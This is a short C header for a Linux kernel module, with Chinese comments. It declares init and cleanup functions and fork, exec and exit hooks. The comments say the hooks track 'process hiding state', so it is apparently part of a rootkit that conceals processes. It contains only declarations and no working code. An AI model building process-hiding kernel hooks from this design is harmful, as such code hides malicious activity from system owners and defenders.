#ifndef _LIFECYCLE_H_
#define _LIFECYCLE_H_

#include <linux/types.h>
#include <linux/sched.h>
#include <linux/binfmts.h>
#include "proc_state.h"
#include "utils/excludes/string_filtering.h"

/* ------------------------------------------------- */
/*                 生命周期 Hook 接口                */
/* ------------------------------------------------- */

/*
 * 初始化生命周期管理：
 * - 注册 fork / exec / exit hook
 * - 通过 proc_state 管理进程隐藏状态
 */
int lifecycle_init(void);

/*
 * 清理生命周期管理：
 * - 注销 hook
 * - 不清理 proc_state，proc_state_cleanup 单独调用
 */
void lifecycle_cleanup(void);

/* ------------------------------------------------- */
/*                 Hook 内部接口（供实现用）         */
/* ------------------------------------------------- */

/* fork hook */
void on_fork(void *ignore, struct task_struct *parent, struct task_struct *child);

/* exec hook */
void on_exec(void *ignore, struct task_struct *task, pid_t old_pid, struct linux_binprm *bprm);

/* exit hook */
void on_exit(void *ignore, struct task_struct *task);

#endif /* _LIFECYCLE_H_ */
